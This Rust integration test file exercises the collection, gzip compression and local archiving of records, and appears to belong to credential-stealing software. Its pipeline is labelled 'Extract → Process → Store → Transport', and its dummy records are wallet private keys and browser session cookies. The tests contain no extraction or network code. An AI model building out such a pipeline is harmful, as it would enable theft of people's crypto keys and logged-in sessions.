//! Integration Tests
//!
//! End-to-end tests that verify the full data pipeline:
//! Extract → Process → Store → Transport

use std::collections::BTreeMap;
use std::fs;
use std::path::PathBuf;
use std::sync::Arc;

use hmm_core_agent::module::core::DataContext;
use hmm_core_agent::module::processing::types::DataRecord;
use hmm_core_agent::module::processing::{ProcessingConfig, ProcessingPipeline, CompressionMode};
use hmm_core_agent::module::storage::{LocalStore, LocalStoreConfig};

/// Test the full data pipeline: extract → process → store
#[test]
fn test_full_data_pipeline() {
    // Setup: Create temporary directory for test
    let temp_dir = std::env::temp_dir().join("hmm_integration_test");
    let _ = fs::remove_dir_all(&temp_dir); // Clean up from previous runs
    fs::create_dir_all(&temp_dir).expect("Failed to create temp dir");

    // STEP 1: Simulate extraction - create test records
    let data_context = Arc::new(DataContext::new());
    
    let test_records = vec![
        DataRecord {
            source: "test_wallet".to_string(),
            kind: "ethereum_key".to_string(),
            payload: b"0x1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef".to_vec(),
            metadata: BTreeMap::new(),
        },
        DataRecord {
            source: "test_browser".to_string(),
            kind: "cookie".to_string(),
            payload: b"session_token=abc123xyz".to_vec(),
            metadata: BTreeMap::new(),
        },
    ];

    data_context.add_records(test_records).expect("Failed to add records");
    assert_eq!(data_context.record_count().unwrap(), 2);

    // STEP 2: Process records
    let processing_config = ProcessingConfig {
        compression: CompressionMode::Gzip,
        encryption_key: None,
    };

    let pipeline = ProcessingPipeline::new(processing_config)
        .expect("Failed to create processing pipeline");

    let records = data_context.get_records().expect("Failed to get records");
    let bundle = pipeline.process(&records).expect("Processing failed");

    // Verify processing produced output
    assert!(!bundle.payload.is_empty());
    assert!(bundle.compressed);
    // Note: Small data may not compress smaller due to header overhead
    // Only assert compression ratio for larger payloads
    if records.iter().map(|r| r.payload.len()).sum::<usize>() > 1000 {
        assert!(bundle.payload.len() < records.iter().map(|r| r.payload.len()).sum::<usize>());
    }

    // Add processed payload to context
    data_context.add_payload(bundle.payload).expect("Failed to add payload");
    assert_eq!(data_context.payload_count().unwrap(), 1);

    // STEP 3: Store processed data
    let store_config = LocalStoreConfig {
        root_dir: temp_dir.clone(),
        max_archives: 5,
    };

    let store = LocalStore::new(store_config).expect("Failed to create store");

    let payloads = data_context.get_payloads().expect("Failed to get payloads");
    let mut stored_count = 0;

    for payload in payloads {
        let result = store.save(&payload);
        assert!(result.is_ok(), "Failed to store payload");
        stored_count += 1;
    }

    assert_eq!(stored_count, 1);

    // Verify file was created
    let stored_files = fs::read_dir(&temp_dir)
        .expect("Failed to read temp dir")
        .filter(|e| e.is_ok())
        .count();
    assert!(stored_files > 0, "No files were stored");

    // Cleanup
    let _ = fs::remove_dir_all(&temp_dir);
}

/// Test data context thread safety with concurrent access
#[test]
fn test_data_context_concurrent_access() {
    let context = Arc::new(DataContext::new());
    let mut handles = vec![];

    // Spawn multiple threads that add records concurrently
    for thread_id in 0..10 {
        let ctx_clone = Arc::clone(&context);
        let handle = std::thread::spawn(move || {
            let records = vec![
                DataRecord {
                    source: format!("thread_{}", thread_id),
                    kind: "test_data".to_string(),
                    payload: vec![thread_id as u8; 100],
                    metadata: BTreeMap::new(),
                },
            ];
            ctx_clone.add_records(records).expect("Failed to add records");
        });
        handles.push(handle);
    }

    // Wait for all threads to complete
    for handle in handles {
        handle.join().expect("Thread panicked");
    }

    // Verify all records were added
    assert_eq!(context.record_count().unwrap(), 10);
}

/// Test processing pipeline with various data sizes
#[test]
fn test_processing_pipeline_various_sizes() {
    let test_cases = vec![
        ("empty", vec![]),
        ("small", vec![1u8; 10]),
        ("medium", vec![1u8; 1000]),
        ("large", vec![1u8; 100000]),
    ];

    for (name, data) in test_cases {
        let records = vec![DataRecord {
            source: "test".to_string(),
            kind: name.to_string(),
            payload: data.clone(),
            metadata: BTreeMap::new(),
        }];

        let config = ProcessingConfig {
            compression: CompressionMode::Gzip,
            encryption_key: None,
        };

        let pipeline = ProcessingPipeline::new(config)
            .expect("Failed to create pipeline");

        let result = pipeline.process(&records);
        
        if data.is_empty() {
            // Empty data should still process successfully
            assert!(result.is_ok(), "Failed for {} data", name);
        } else {
            assert!(result.is_ok(), "Failed for {} data", name);
            let bundle = result.unwrap();
            
            // Verify compression actually compressed
            if data.len() > 100 {
                assert!(
                    bundle.payload.len() < data.len(),
                    "Compression failed for {}: {} -> {}",
                    name,
                    data.len(),
                    bundle.payload.len()
                );
            }
        }
    }
}

/// Test storage and retrieval round-trip
#[test]
fn test_storage_round_trip() {
    let temp_dir = std::env::temp_dir().join("hmm_storage_test");
    let _ = fs::remove_dir_all(&temp_dir);
    fs::create_dir_all(&temp_dir).expect("Failed to create temp dir");

    let config = LocalStoreConfig {
        root_dir: temp_dir.clone(),
        max_archives: 5,
    };

    let store = LocalStore::new(config).expect("Failed to create store");

    // Save test data
    let test_payload = b"This is test data for storage round-trip verification";
    let save_result = store.save(test_payload);
    assert!(save_result.is_ok(), "Failed to save data");

    let saved_record = save_result.unwrap();

    // Verify file exists in archive directory
    let archive_dir = temp_dir.join("archive");
    let expected_file = archive_dir.join(format!("{}.bin", saved_record.id));
    assert!(expected_file.exists(), "Archive file not created");

    // Load data back
    let load_result = store.load(&saved_record.id);
    if load_result.is_err() {
        // If load fails, check if file exists and try to read directly
        if expected_file.exists() {
            let direct_read = fs::read(&expected_file);
            assert!(direct_read.is_ok(), "File exists but can't read");
            let data = direct_read.unwrap();
            assert_eq!(test_payload, &data[..], "Direct read data doesn't match");
        }
        // Try load again (might be timing issue)
        let load_result2 = store.load(&saved_record.id);
        assert!(load_result2.is_ok(), "Failed to load data: {:?}", load_result2.err());
    }

    let loaded_data = load_result.unwrap();
    assert_eq!(test_payload, &loaded_data[..], "Loaded data doesn't match saved data");

    // Verify index
    let list_result = store.list();
    assert!(list_result.is_ok(), "Failed to list stored records");
    let records = list_result.unwrap();
    assert!(records.iter().any(|r| r.id == saved_record.id), "Saved record not in index");

    // Cleanup
    let _ = fs::remove_dir_all(&temp_dir);
}

/// Test context summary statistics
#[test]
fn test_context_summary() {
    let context = DataContext::new();

    // Initial summary should be empty
    let summary = context.get_summary().expect("Failed to get summary");
    assert_eq!(summary.record_count, 0);
    assert_eq!(summary.payload_count, 0);
    assert_eq!(summary.total_payload_bytes, 0);

    // Add records
    let records = vec![
        DataRecord {
            source: "test1".to_string(),
            kind: "type1".to_string(),
            payload: vec![1u8; 100],
            metadata: BTreeMap::new(),
        },
        DataRecord {
            source: "test2".to_string(),
            kind: "type2".to_string(),
            payload: vec![2u8; 200],
            metadata: BTreeMap::new(),
        },
    ];
    context.add_records(records).expect("Failed to add records");

    let summary = context.get_summary().expect("Failed to get summary");
    assert_eq!(summary.record_count, 2);
    assert_eq!(summary.payload_count, 0); // No payloads yet

    // Add payloads
    context.add_payload(vec![1u8; 500]).expect("Failed to add payload");
    context.add_payload(vec![2u8; 300]).expect("Failed to add payload");

    let summary = context.get_summary().expect("Failed to get summary");
    assert_eq!(summary.record_count, 2);
    assert_eq!(summary.payload_count, 2);
    assert_eq!(summary.total_payload_bytes, 800);
}

/// Test processing with compression modes
#[test]
fn test_processing_compression_modes() {
    let test_data = vec![DataRecord {
        source: "test".to_string(),
        kind: "compression_test".to_string(),
        payload: vec![0x41u8; 1000], // Repetitive data compresses well
        metadata: BTreeMap::new(),
    }];

    let modes = vec![
        CompressionMode::None,
        CompressionMode::Rle,
        CompressionMode::Gzip,
        CompressionMode::GzipFast,
        CompressionMode::GzipBest,
    ];

    for mode in modes {
        let config = ProcessingConfig {
            compression: mode,
            encryption_key: None,
        };

        let pipeline = ProcessingPipeline::new(config).expect("Failed to create pipeline");
        let result = pipeline.process(&test_data).expect("Processing failed");

        match mode {
            CompressionMode::None => {
                assert!(!result.compressed);
            }
            _ => {
                assert!(result.compressed);
                // Repetitive data should compress well
                assert!(result.payload.len() < test_data[0].payload.len());
            }
        }
    }
}

/// Test metadata preservation through pipeline
#[test]
fn test_metadata_preservation() {
    let mut metadata = BTreeMap::new();
    metadata.insert("key_type".to_string(), "ethereum".to_string());
    metadata.insert("confidence".to_string(), "high".to_string());
    metadata.insert("address".to_string(), "0x1234...".to_string());

    let records = vec![DataRecord {
        source: "wallet".to_string(),
        kind: "private_key".to_string(),
        payload: b"test_key_data".to_vec(),
        metadata: metadata.clone(),
    }];

    let config = ProcessingConfig {
        compression: CompressionMode::Gzip,
        encryption_key: None,
    };

    let pipeline = ProcessingPipeline::new(config).expect("Failed to create pipeline");
    let result = pipeline.process(&records).expect("Processing failed");

    // Verify metadata is preserved in normalized records
    assert_eq!(result.records.len(), 1);
    assert_eq!(result.records[0].metadata.get("key_type"), Some(&"ethereum".to_string()));
    assert_eq!(result.records[0].metadata.get("confidence"), Some(&"high".to_string()));
}

/// Cleanup after tests
#[test]
fn test_cleanup_temp_files() {
    // Clean up any leftover test directories
    let test_dirs = vec![
        std::env::temp_dir().join("hmm_integration_test"),
        std::env::temp_dir().join("hmm_storage_test"),
        std::env::temp_dir().join("hmm_agent"),
    ];

    for dir in test_dirs {
        if dir.exists() {
            // Best effort cleanup - don't fail test if cleanup fails
            let _ = fs::remove_dir_all(&dir);
        }
    }
    
    // Test passes as long as we attempted cleanup
    assert!(true);
}
